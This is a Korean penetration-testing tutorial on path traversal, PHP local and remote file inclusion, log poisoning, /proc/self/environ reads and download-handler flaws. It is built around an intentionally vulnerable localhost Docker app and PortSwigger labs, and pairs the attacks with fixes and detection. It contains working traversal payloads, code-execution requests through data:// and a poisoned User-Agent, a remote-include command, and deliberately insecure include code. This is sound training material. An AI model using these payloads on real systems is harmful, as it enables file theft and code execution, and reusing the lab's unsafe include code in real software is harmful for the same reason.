---
title: 웹 취약점 진단 경로 조작·파일 포함편 — 정규화 우회에서 LFI·RFI까지
description: 경로 정규화 우회와 PHP 파일 포함 조건을 실습하며 Traversal·LFI·RFI·다운로드 취약점을 판별하는 심화 가이드입니다.
tags:
  - 정보보안
  - 취약점진단
  - Path Traversal
  - LFI
  - RFI
---

> [!warning] 허가된 환경에서만 실습하세요
> 아래 요청은 **PortSwigger Web Security Academy가 발급한 개인 랩** 또는 이 글의 `127.0.0.1` 전용 Docker 앱에서만 실행합니다. 실제 서비스의 설정·로그·환경 파일을 읽거나 원격 포함을 시도하지 마세요. Docker 실습의 민감값과 원격 파일은 모두 고정된 가짜 marker다.

[[웹 취약점 진단 기법 입문 — XXE, SSRF부터 SQLi, XSS까지]]에서 `../`과 canonical path 기초를 다뤘다. 여기서는 **URL 디코더 → 애플리케이션 필터 → 운영체제 경로 API → 파일 읽기/포함기**가 같은 입력을 다르게 해석하는 지점을 따라간다. 브라우저가 API 경로를 바꾸는 CSPT는 [[웹 취약점 진단 심화 2 — 브라우저·데이터·변환기 경계 파고들기]]를 참고한다.

## 기법 요약표

| 기법 | 단서 기능 | 성립 조건 | 영향 |
|---|---|---|---|
| 기본 Path Traversal | 이미지·첨부·템플릿·백업 조회 | 사용자 입력이 파일 경로에 직접 결합됨 | 임의 파일 읽기·쓰기 |
| 인코딩·이중 인코딩 | 프록시·WAF 뒤의 파일 API | 검사 뒤 추가 디코딩 또는 계층별 디코딩 횟수 차이 | 필터 우회 |
| 널바이트·정규화 우회 | 강제 확장자·접두사 검증 | 레거시 런타임·네이티브 API가 문자열 끝이나 경로를 다르게 해석 | 강제 확장자 우회 |
| Windows 경로 | Windows/IIS·SMB 연계 앱 | `\`, 드라이브, UNC, 장치명, ADS를 누락 | 로컬·공유 파일 접근 |
| LFI와 `php://filter` | `page`, `template`, `lang` | 비신뢰 값이 `include`·`require` 또는 파일 API로 전달 | 소스·설정 읽기 |
| `data://`·로그 포이즈닝 | PHP include와 요청 로그 | 공격자 바이트가 포함 가능한 파일·스트림에 쓰이고 PHP로 해석 | 코드 실행 |
| `/proc/self/environ` 포함 | Linux PHP 프로세스 | procfs 접근과 환경값 읽기/포함 가능 | 자격증명 노출, 조건부 코드 실행 |
| RFI | URL을 받는 include | URL wrapper와 `allow_url_include`가 켜지고 외부 접근 가능 | 원격 코드 실행 |
| 파일 다운로드 핸들러 | `download.do`, `fileId`, `path`, `name` | 표시명·물리 경로를 직접 신뢰하거나 인가가 빠짐 | 민감 파일·타 사용자 첨부 유출 |

## 공통 localhost Docker 실습 앱

아래 앱은 LFI wrapper, 로그 포함, `/proc/self/environ`, RFI를 한 번에 관찰하도록 **의도적으로** `allow_url_include=1`을 켠다. 호스트 포트는 `127.0.0.1`에만 바인딩한다.

`docker-compose.yml`:

```yaml
services:
  victim:
    build: ./victim
    environment:
      LAB_ENV_MARKER: ENVIRONMENT_READ_OK
    ports:
      - "127.0.0.1:8090:8000"
    depends_on:
      - remote
  remote:
    image: python:3.12-alpine
    working_dir: /srv
    command: ["python", "-m", "http.server", "9001", "--bind", "0.0.0.0"]
    volumes:
      - ./remote:/srv:ro
```

`victim/Dockerfile`:

```dockerfile
FROM php:8.2-cli
COPY lab.ini /usr/local/etc/php/conf.d/lab.ini
COPY index.php /var/www/html/index.php
COPY files/ /var/www/html/files/
WORKDIR /var/www/html
CMD ["php", "-S", "0.0.0.0:8000", "index.php"]
```

`victim/lab.ini`:

```ini
allow_url_fopen=1
allow_url_include=1
```

`victim/index.php`:

```php
<?php
declare(strict_types=1);

$mode = $_GET['mode'] ?? '';
$value = $_GET['value'] ?? '';
$logLine = ($_SERVER['REMOTE_ADDR'] ?? '-') . ' "' .
    ($_SERVER['REQUEST_METHOD'] ?? '-') . ' ' . ($_SERVER['REQUEST_URI'] ?? '-') .
    '" "' . ($_SERVER['HTTP_USER_AGENT'] ?? '-') . "\n";
file_put_contents('/tmp/lab-access.log', $logLine, FILE_APPEND | LOCK_EX);

if ($mode === 'read') {
    $path = '/var/www/html/files/' . $value;
    if (!is_file($path)) {
        http_response_code(404);
        exit("not found\n");
    }
    header('Content-Type: text/plain');
    readfile($path);
    exit;
}

if ($mode === 'include') {
    include $value;
    exit;
}

http_response_code(400);
echo "use ?mode=read&value= or ?mode=include&value=\n";
```

`victim/files/report.txt`:

```text
PUBLIC_REPORT_OK
```

`victim/files/config.php`:

```php
<?php
$database_password = 'LOCAL_FAKE_PASSWORD';
```

`remote/remote.txt`:

```php
<?php echo "RFI_INCLUDE_OK\n"; ?>
```

다음 구조로 저장하고 실행한다.

```text
path-lfi-lab/
├── docker-compose.yml
├── remote/
│   └── remote.txt
└── victim/
    ├── Dockerfile
    ├── index.php
    ├── lab.ini
    └── files/
        ├── config.php
        └── report.txt
```

```bash
docker compose up --build -d
curl -s 'http://127.0.0.1:8090/?mode=read&value=report.txt'
# 기대: PUBLIC_REPORT_OK
```

> [!success] 직접 검증
> 2026-11-27 Docker Engine 29.5.2에서 이미지 빌드와 아래 `read`, `php://filter`, `data://`, 로그 포이즈닝, `/proc/self/environ`, RFI 요청을 실행해 marker를 확인했다. PortSwigger 랩은 공식 페이지의 이름과 URL만 검증했으며, 이 작업에서 개인 랩 인스턴스를 직접 풀지는 않았다.

## 1. Path Traversal — 인코딩·이중 인코딩·정규화 우회

### 원리·단서 기능·성립 조건

애플리케이션이 `/srv/images/` 뒤에 `filename`을 붙이면 `../../../etc/passwd`는 상위 디렉터리로 이동한다. 방어가 `../` 한 번 삭제에 그치면 `....//`가 삭제 후 `../`로 남는다. WAF는 한 번 디코딩하고 프레임워크가 다시 디코딩하면 `%252e%252e%252f`가 뒤 계층에서 `../`가 된다.

- **단서 기능**: `filename`, `path`, `template`, `folder`, `lang`, `theme`, 이미지 프록시·백업 복원.
- **성립 조건**: 입력이 파일 API에 결합되고, 정규화된 최종 경로의 기준 디렉터리 포함 여부를 확인하지 않음.

### 따라하기 — PortSwigger 공식 랩 3개

1. [Lab: File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)

```http
GET /image?filename=../../../etc/passwd HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

2. [Lab: File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)

```http
GET /image?filename=....//....//....//etc/passwd HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

3. [Lab: File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)

```http
GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

**기대 결과와 성공 기준**: 각 랩 응답에서 `/etc/passwd` 형식의 계정 행을 읽고 랩이 solved 상태가 된다. 200과 이미지 깨짐만으로는 성공이 아니다.

### 진단 체크리스트·오탐 구분

- [ ] 원문, 프록시 디코딩 뒤, 애플리케이션 값, OS canonical path를 단계별로 기록했다.
- [ ] `../`, `..\`, 중첩, 단일·이중 URL 인코딩, 절대 경로를 최소 요청으로 비교했다.
- [ ] 오류 페이지의 `/etc/passwd` 문자열이나 정적 샘플을 실제 파일 내용으로 오인하지 않았다.
- [ ] 읽기와 쓰기 권한을 별도 검증하고 불필요한 파일 변경은 하지 않았다.

### 조치

사용자에게 파일 경로 대신 불투명 ID를 받고 서버가 DB에서 경로를 찾는 것이 우선이다. 경로 입력이 꼭 필요하면 정확히 한 번 디코딩·정규화하고, 검사한 최종 경로가 기준 디렉터리의 자식인지 확인한 뒤 **같은 경로 객체**를 열어야 한다.

```java
Path base = Path.of("/srv/app/files").toRealPath();
Path candidate = base.resolve(userValue).normalize();
if (!candidate.startsWith(base)) {
    throw new SecurityException("path escapes base directory");
}
try (InputStream input = Files.newInputStream(candidate)) {
    // stream the approved file
}
```

심볼릭 링크 경쟁까지 고려하려면 디렉터리 핸들 기준의 안전한 API와 최소 권한 저장소를 사용한다.

### 탐지 포인트·출처

`..`, `%2e`, `%25`, 혼합 `/`·`\`, 반복 디코딩 뒤 traversal이 되는 입력, 파일 서비스가 기준 디렉터리 밖을 연 이벤트를 원문과 canonical path 양쪽에서 기록한다.

- [PortSwigger — Path traversal](https://portswigger.net/web-security/file-path-traversal)
- [OWASP Path Traversal Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Path_Traversal_Prevention_Cheat_Sheet.html)
- [OWASP WSTG — Testing Directory Traversal File Include](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include)

## 2. 널바이트·강제 접두사·강제 확장자 우회

### 원리·단서 기능·성립 조건

애플리케이션이 `.png`를 강제로 붙이거나 `/var/www/images` 접두사를 확인해도 검사 이후 해석이 달라질 수 있다. 레거시 네이티브 API가 `\0`을 문자열 끝으로 보던 환경에서는 `../../../etc/passwd%00.png`가 `.png` 검사에는 합격하고 파일 API에는 `/etc/passwd`로 보였다. 현대 PHP·Java 등에서는 널바이트가 대개 거부되므로 **레거시 조건을 확인하지 않은 널바이트 보고는 오탐**이다.

### 따라하기 — PortSwigger 공식 랩 2개

- [Lab: File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)

```text
/var/www/images/../../../etc/passwd
```

- [Lab: File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)

```text
../../../etc/passwd%00.png
```

각 랩의 `filename`에 값을 넣고 응답에서 실제 `/etc/passwd`를 읽으면 성공이다.

### 진단 체크리스트·오탐 구분·조치

- [ ] 강제 접두사·접미사가 적용되는 정확한 시점을 확인했다.
- [ ] `%00`이 중간 계층에서 거부·보존·디코딩되는지 확인했다.
- [ ] 널바이트 없이도 절대 경로·canonicalization 결함이 성립하는지 분리했다.
- [ ] 현대 런타임의 400·예외를 취약점으로 올리지 않았다.

문자열 접두사/접미사 검사가 아니라 허용 ID 매핑과 canonical path 포함 검사를 쓴다. 로그에는 `%00`, 실제 NUL 거부, 접두사 뒤 `..`를 남기되 오류 본문에는 서버 경로를 노출하지 않는다.

### 출처

- [CWE-158 — Improper Neutralization of Null Byte](https://cwe.mitre.org/data/definitions/158.html)
- [PortSwigger — Common obstacles to exploiting path traversal](https://portswigger.net/web-security/file-path-traversal#common-obstacles-to-exploiting-path-traversal-vulnerabilities)

## 3. Windows 경로 — 역슬래시·UNC·장치명·ADS

### 원리·단서 기능·성립 조건

Windows에서는 `/`와 `\`가 모두 구분자가 될 수 있고 `C:\...`, `\\server\share\...`, `\\?\`, `\\.\`는 서로 다른 이름 공간을 연다. `CON`, `NUL`, `COM1` 같은 예약 장치명과 NTFS Alternate Data Streams의 `file.txt:stream`도 단순 POSIX 필터가 놓치는 입력이다. UNC가 허용되면 파일 읽기가 SMB 인증 시도나 내부망 접근으로 확대될 수 있다.

### 따라하기 — 허가된 Windows 대상 또는 PortSwigger 기본 랩

PortSwigger의 [Lab: File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)는 Linux 랩이므로 `/etc/passwd`로 푼다. Windows 대상은 **자신이 소유한 평가 환경에서만** 다음 무해한 파일을 읽어 플랫폼 차이를 확인한다.

```http
GET /download?filename=..%5c..%5c..%5cWindows%5cwin.ini HTTP/1.1
Host: 127.0.0.1
```

`[fonts]`, `[extensions]` 같은 `win.ini` 내용이 반환되면 역슬래시 traversal 성공이다. UNC는 외부 서버가 아니라 별도 localhost/격리 SMB 실습망에서만 검사한다.

### 진단 체크리스트·오탐 구분

- [ ] 대상 OS와 실제 파일 API가 `/`·`\`를 어떻게 처리하는지 확인했다.
- [ ] 드라이브 절대 경로, UNC, 장치 접두사, ADS `:`와 끝점·끝공백을 확인했다.
- [ ] Linux 컨테이너에서 `C:\` 문자열이 보였다는 이유로 Windows traversal을 판정하지 않았다.
- [ ] SMB 인증 시도는 승인된 격리 수신기에서만 관찰했다.

### 조치·탐지 포인트

플랫폼 경로 API로 정규화하고 기준 루트 포함 여부를 대소문자 규칙까지 맞춰 검사한다. 외부 입력의 `:`, UNC·장치 접두사, 예약 이름을 거부하고 서비스 계정의 네트워크 로그온과 SMB egress를 제한한다. 탐지는 `win.ini`, `boot.ini`, `\\?\`, `\\.\`, UNC와 웹 프로세스의 445/TCP 연결을 묶는다.

### 출처

- [Microsoft — Naming Files, Paths, and Namespaces](https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file)
- [Microsoft — File Streams](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams)

## 4. LFI와 `php://filter` — 실행하지 않고 소스 읽기

### 원리·단서 기능·성립 조건

LFI(Local File Inclusion)는 비신뢰 경로가 PHP `include`·`require`에 들어가 로컬 파일을 포함하는 결함이다. 평범한 PHP 파일을 include하면 실행되어 소스가 보이지 않지만, `php://filter/convert.base64-encode/resource=...`는 읽은 바이트를 Base64로 바꿔 출력하므로 설정·소스를 회수할 수 있다. `php://filter` 자체는 `allow_url_include`가 꺼져 있어도 파일 읽기에 쓰일 수 있다.

### 따라하기 — 공통 Docker

```bash
curl -sG 'http://127.0.0.1:8090/' \
  --data-urlencode 'mode=include' \
  --data-urlencode 'value=php://filter/convert.base64-encode/resource=/var/www/html/files/config.php' \
  | base64 -d
# 기대: $database_password = 'LOCAL_FAKE_PASSWORD';
```

**성공 기준**: 원래 include라면 실행되어 숨을 `config.php`의 PHP 소스가 디코딩되어 보인다.

### 진단 체크리스트·오탐 구분

- [ ] `readfile`형 traversal과 `include`형 LFI를 구분했다.
- [ ] 절대·상대 경로, wrapper 허용 여부, `open_basedir`를 확인했다.
- [ ] Base64처럼 보이는 임의 응답이 아니라 디코딩된 실제 소스 marker를 확인했다.
- [ ] 오류 메시지에 경로만 노출된 경우 정보 노출과 파일 읽기를 구분했다.

### 조치

```php
<?php
$templates = [
    'home' => __DIR__ . '/templates/home.php',
    'help' => __DIR__ . '/templates/help.php',
];
$key = $_GET['page'] ?? 'home';
if (!array_key_exists($key, $templates)) {
    http_response_code(404);
    exit;
}
include $templates[$key];
```

경로가 아니라 고정 키를 받는다. `allow_url_include=0`, 필요한 경우 좁은 `open_basedir`, 읽기 전용 코드 배포와 최소 권한을 방어층으로 더한다.

### 탐지 포인트·출처

`php://`, `convert.base64`, `resource=`, 설정 파일 경로, include 경고 급증을 탐지하고 파라미터의 원문과 최종 파일 경로를 함께 남긴다.

- [PHP Manual — `php://` wrappers](https://www.php.net/manual/en/wrappers.php.php)
- [PHP Manual — `include`](https://www.php.net/manual/en/function.include.php)

## 5. `data://` 포함 — 입력이 곧 PHP 코드가 되는 조건

### 원리·단서 기능·성립 조건

`data://`는 URL 안에 데이터 자체를 담는다. PHP에서 `include` 대상이 사용자 입력이고 `allow_url_include=1`이면 PHP 태그를 가진 data URI가 코드로 해석될 수 있다. PHP 7.4부터 `allow_url_include`는 deprecated이고 기본값은 꺼져 있으므로, 설정 확인 없이 일반화하면 안 된다.

### 따라하기 — 공통 Docker

```bash
curl -sG 'http://127.0.0.1:8090/' \
  --data-urlencode 'mode=include' \
  --data-urlencode 'value=data://text/plain;base64,PD9waHAgZWNobyAiREFUQV9JTkNMVURFX09LXG4iOyA/Pg=='
# 기대: DATA_INCLUDE_OK
```

marker가 출력되면 URL include와 PHP 실행이 모두 성립한다. 단순히 data URI 본문이 문자로 출력된 것은 코드 실행 성공이 아니다.

### 진단 체크리스트·오탐 구분·조치

- [ ] `allow_url_include`, `allow_url_fopen`, PHP 버전을 각각 확인했다.
- [ ] 프록시·프레임워크가 `+`, `%`, `,`를 바꾸는지 확인했다.
- [ ] 출력과 PHP 실행을 고정 marker로 구분했다.
- [ ] 운영 기본값이 꺼졌다면 설정 취약점이 없다고 기록했다.

비신뢰 값을 include하지 않고 `allow_url_include=0`을 강제한다. 탐지에는 `data://`, `base64,`, URL 안의 PHP 태그와 설정 변경을 포함한다.

### 출처

- [PHP Manual — `data://`](https://www.php.net/manual/en/wrappers.data.php)
- [PHP Runtime Configuration — `allow_url_include`](https://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-include)

## 6. 로그 포이즈닝 — 쓰기 가능한 요청 로그를 LFI로 실행하기

### 원리·단서 기능·성립 조건

웹 서버나 애플리케이션 access log는 `User-Agent`, 요청 경로 같은 공격자 입력을 저장한다. LFI가 그 로그를 PHP로 include하고 로그 파일이 PHP 프로세스에 읽히면, 로그 속 PHP 태그가 실행될 수 있다. 조건은 로그 경로·포맷·권한·회전 상태가 맞고 입력이 잘리지 않는 것이다.

### 따라하기 — 공통 Docker

1. 고정 marker를 User-Agent에 남긴다.

```bash
curl -s -A '<?php echo 424242; ?>' \
  'http://127.0.0.1:8090/?mode=read&value=report.txt'
```

2. access log를 include한다.

```bash
curl -sG 'http://127.0.0.1:8090/' \
  --data-urlencode 'mode=include' \
  --data-urlencode 'value=/tmp/lab-access.log'
# 기대: 로그 행 사이에 424242
```

**성공 기준**: 두 번째 요청에서 marker가 PHP 실행 결과로 나타난다. 첫 요청이 로그에 문자 그대로 기록된 것만으로는 코드 실행이 아니다.

### 진단 체크리스트·오탐 구분

- [ ] 실제 로그 경로, PHP 계정 읽기 권한, 로그 포맷과 회전을 확인했다.
- [ ] User-Agent 외 Referer·요청 경로가 어떻게 escape되는지 확인했다.
- [ ] 저장된 문자열과 include 시 실행 결과를 분리했다.
- [ ] 운영 로그를 훼손하지 않고 고유한 무해 marker 한 번만 사용했다.

### 조치·탐지 포인트

근본 조치는 사용자 경로 include 제거다. 로그는 웹 루트와 애플리케이션 읽기 범위 밖에 두고 별도 계정·수집기로 전송한다. HTTP 헤더의 스크립트 태그, include 파라미터의 `/var/log`, 웹 프로세스의 로그 파일 open 뒤 비정상 응답을 상관 분석한다.

### 출처

- [OWASP WSTG — Testing for Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion)
- [Apache Log Files](https://httpd.apache.org/docs/current/logs.html)

## 7. `/proc/self/environ` — 실행 중 프로세스의 환경 읽기

### 원리·단서 기능·성립 조건

Linux의 `/proc/self/environ`은 현재 프로세스 환경을 NUL로 구분해 노출한다. LFI·파일 읽기가 procfs에 도달하면 DB URL, API 키, 클라우드 설정 같은 환경 변수가 유출될 수 있다. 요청 헤더가 CGI 환경 변수로 매 요청 반영되던 특정 구성에서는 코드 주입과 결합될 수 있었지만, PHP-FPM·Apache의 현대 구성에 일괄 적용되지 않는다.

### 따라하기 — 공통 Docker

```bash
curl -sG 'http://127.0.0.1:8090/' \
  --data-urlencode 'mode=include' \
  --data-urlencode 'value=php://filter/convert.base64-encode/resource=/proc/self/environ' \
  | base64 -d | tr '\0' '\n' | grep LAB_ENV_MARKER
# 기대: LAB_ENV_MARKER=ENVIRONMENT_READ_OK
```

**성공 기준**: 컨테이너에 넣은 가짜 환경 marker가 출력된다. 헤더가 환경에 반영되지 않는다면 코드 실행까지 주장하지 않는다.

### 진단 체크리스트·오탐 구분·조치

- [ ] `/proc` mount와 hidepid, 컨테이너·호스트 PID namespace를 확인했다.
- [ ] 고정 환경값 읽기와 요청 헤더 기반 코드 실행을 구분했다.
- [ ] 실제 비밀값은 보고서에 원문을 남기지 않고 존재와 영향만 증명했다.
- [ ] 오류 또는 빈 결과를 임의로 복원하지 않았다.

비밀은 가능하면 파일 기반 secret store와 짧은 수명 자격증명으로 제공하고, 서비스 계정·컨테이너가 불필요한 procfs와 다른 프로세스를 보지 못하게 한다. `/proc/`, `self/environ`, Base64 filter 요청과 환경 자격증명의 비정상 사용을 탐지한다.

### 출처

- [Linux proc_pid_environ(5)](https://man7.org/linux/man-pages/man5/proc_pid_environ.5.html)
- [Docker Compose — Secrets](https://docs.docker.com/compose/how-tos/use-secrets/)

## 8. RFI — 원격 파일을 include하는 조건

### 원리·단서 기능·성립 조건

RFI(Remote File Inclusion)는 사용자 URL이 `include`로 전달되고 URL-aware wrapper가 원격 응답을 가져와 PHP로 해석할 때 성립한다. PHP에서는 `allow_url_include=1`, 해당 wrapper, 네트워크 egress가 필요하다. LFI보다 조건이 강하지만 성립하면 원격 응답을 곧바로 코드로 실행할 수 있다.

### 따라하기 — 공통 Docker

Docker 네트워크 안의 `remote` 서비스만 사용한다.

```bash
curl -sG 'http://127.0.0.1:8090/' \
  --data-urlencode 'mode=include' \
  --data-urlencode 'value=http://remote:9001/remote.txt'
# 기대: RFI_INCLUDE_OK
```

응답 marker가 출력되면 victim이 remote HTTP 응답을 가져와 PHP로 실행한 것이다. 브라우저 리다이렉트나 원격 텍스트 출력만으로는 RFI 코드 실행을 증명하지 못한다.

### 진단 체크리스트·오탐 구분

- [ ] URL include 설정, 지원 wrapper, DNS·redirect, egress를 확인했다.
- [ ] SSRF(가져오기)와 RFI(가져온 내용을 코드로 include)를 구분했다.
- [ ] localhost Docker 밖 주소를 사용하지 않았다.
- [ ] `allow_url_include=0`인데 단순 HTTP 클라이언트가 있는 경우 RFI로 잘못 분류하지 않았다.

### 조치·탐지 포인트

비신뢰 값을 include하지 않고 `allow_url_include=0`을 배포 검사로 강제한다. 실행 컨테이너의 egress를 필요한 목적지로만 제한한다. include 파라미터의 `http(s)://`, 내부 DNS 조회, PHP 프로세스의 예기치 않은 outbound 연결과 응답 내 실행 marker를 연계한다.

### 출처

- [PHP Manual — `include`](https://www.php.net/manual/en/function.include.php)
- [OWASP WSTG — Testing for Remote File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion)

## 9. 파일 다운로드 기능 — 경로와 인가를 함께 본다

### 원리·단서 기능·성립 조건

국내 업무 시스템에서 흔히 보이는 형태를 특정 제품과 무관하게 일반화하면 다음과 같다.

```text
GET /download?path=/upload/2026/11/&name=contract.pdf
GET /file/download?fileId=10482
POST /common/fileDownload.do  body: groupId=7&seq=3
```

첫 패턴은 물리 경로 조작, 둘째·셋째는 IDOR/BOLA가 핵심이다. `fileId`가 안전한 숫자여도 현재 사용자가 그 첨부를 읽을 권한이 없으면 취약하다. 상세 인가 매트릭스는 [[웹 취약점 진단 인가편 — 권한 매트릭스로 BOLA·BFLA 찾기]]로 넘긴다.

### 따라하기 — 공통 Docker와 두 계정 비교

경로형은 공통 Docker에서 기준 파일과 상위 파일을 비교한다.

```bash
curl -sG 'http://127.0.0.1:8090/' \
  --data-urlencode 'mode=read' --data-urlencode 'value=report.txt'
curl -sG 'http://127.0.0.1:8090/' \
  --data-urlencode 'mode=read' --data-urlencode 'value=../index.php'
# 기대: 두 번째 응답에 PHP 소스가 나타남
```

ID형은 허가된 테스트 시스템에서 A가 소유한 첨부 요청을 캡처하고 **세션만 B로 바꿔 같은 `fileId`**를 요청한다. A의 파일 바이트가 B에게 반환되면 인가 실패다. 실제 문서 대신 테스트 marker 파일을 사용한다.

### 진단 체크리스트·오탐 구분

- [ ] 표시명·저장명·물리 경로·DB ID 중 사용자가 통제하는 값을 찾았다.
- [ ] path와 name의 중복 파라미터, GET/POST, 모바일/API 경로를 비교했다.
- [ ] 두 계정과 두 소유 객체로 수평 인가를 검증했다.
- [ ] 200 빈 파일·공통 샘플·공개 첨부를 타 사용자 파일 유출로 오인하지 않았다.

### 조치

다운로드 요청은 불투명한 파일 ID만 받고, 서버가 `file_id + tenant_id + owner/permission`으로 한 번에 조회한다. 저장 경로는 DB의 신뢰된 값에서 만들고, 사용자 표시명은 `Content-Disposition`에 안전하게 인코딩한다.

```sql
SELECT storage_key, display_name, mime_type
FROM attachments
WHERE id = :file_id
  AND tenant_id = :tenant_id
  AND owner_id = :current_user_id;
```

### 탐지 포인트·출처

연속 ID 열거, 한 세션의 다수 tenant 파일 요청, `path`·`name`의 traversal, 존재 여부에 따른 200/404 크기 차이를 탐지한다. 다운로드 감사 로그에는 사용자·tenant·file ID·결정 결과를 남기되 실제 서버 경로는 응답에 노출하지 않는다.

- [OWASP Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)
- [OWASP Insecure Direct Object Reference Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)

## 10. 읽어야 할 고가치 파일 — 영향 확인은 최소한으로

경로 조작·LFI가 성립하면 무작정 파일을 수집하지 말고, 승인 범위에서 가짜 marker나 최소 메타데이터로 영향만 확인한다.

| 범주 | 예시 위치·이름 | 얻을 수 있는 것 | 안전한 확인 방식 |
|---|---|---|---|
| 애플리케이션 설정 | `.env`, `application.yml`, `config.php`, `web.config` | DB·API·세션 설정 | 키 이름과 가짜 테스트 값만 확인 |
| 소스·배포물 | Git 작업 트리, JAR/WAR, 템플릿, 백업 | 숨은 API·쿼리·검증 로직 | 테스트 파일 한 개 또는 해시 |
| 인증 키 | SSH key, JWT 서명 키, TLS private key, cloud credential | 계정·토큰 위조 가능성 | 원문 복사 금지, 존재·권한만 기록 |
| 런타임 정보 | `/proc/self/environ`, 프로세스 명령행, 컨테이너 secret mount | 환경 자격증명·내부 주소 | 고정 marker 또는 마스킹 |
| 서버·프레임워크 설정 | Apache/Nginx/PHP 설정, Spring 설정 | 실행기·경로·wrapper 조건 | 관련 지시어 몇 개만 확인 |
| 로그·세션 | access/error log, 세션 저장소 | 토큰·개인정보·로그 포이즈닝 | 테스트 세션·고유 marker만 사용 |
| Windows 설정 | `web.config`, 앱 설정, 서비스 계정 프로필 | 연결 문자열·공유 경로 | 테스트 인스턴스의 가짜 값 |

### 진단 체크리스트·조치·탐지

- [ ] 데이터 소유자와 수집 허용 범위를 먼저 확인했다.
- [ ] 자격증명·개인정보 원문을 보고서와 프록시 프로젝트에 남기지 않았다.
- [ ] 획득한 비밀로 후속 로그인을 자동 시도하지 않았다.
- [ ] 파일 읽기 증거와 그 파일로 가능한 후속 영향을 분리했다.

비밀은 파일·환경에서 제거해 전용 secret manager, 짧은 수명, 최소 권한, 회전 절차로 관리한다. 민감 경로 open 실패·성공, 웹 계정의 코드/secret 경로 접근, 읽힌 자격증명의 새 사용을 감시한다.

### 출처

- [OWASP Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)
- [CWE-200 — Exposure of Sensitive Information](https://cwe.mitre.org/data/definitions/200.html)

## 다음 단계로 이어지는 공격

설정·환경·소스 읽기는 DB 접속 정보, 세션/JWT 키, 내부 API 주소를 드러내 인증 우회·데이터 접근·내부망 피벗으로 이어진다. 로그·`data://`·RFI가 코드 실행으로 상승하면 웹 프로세스 권한의 파일 쓰기와 내부 서비스 접근이 다음 단계다. 다운로드 핸들러의 인가 실패는 다른 사용자의 문서·개인정보 대량 수집으로 이어질 수 있다.
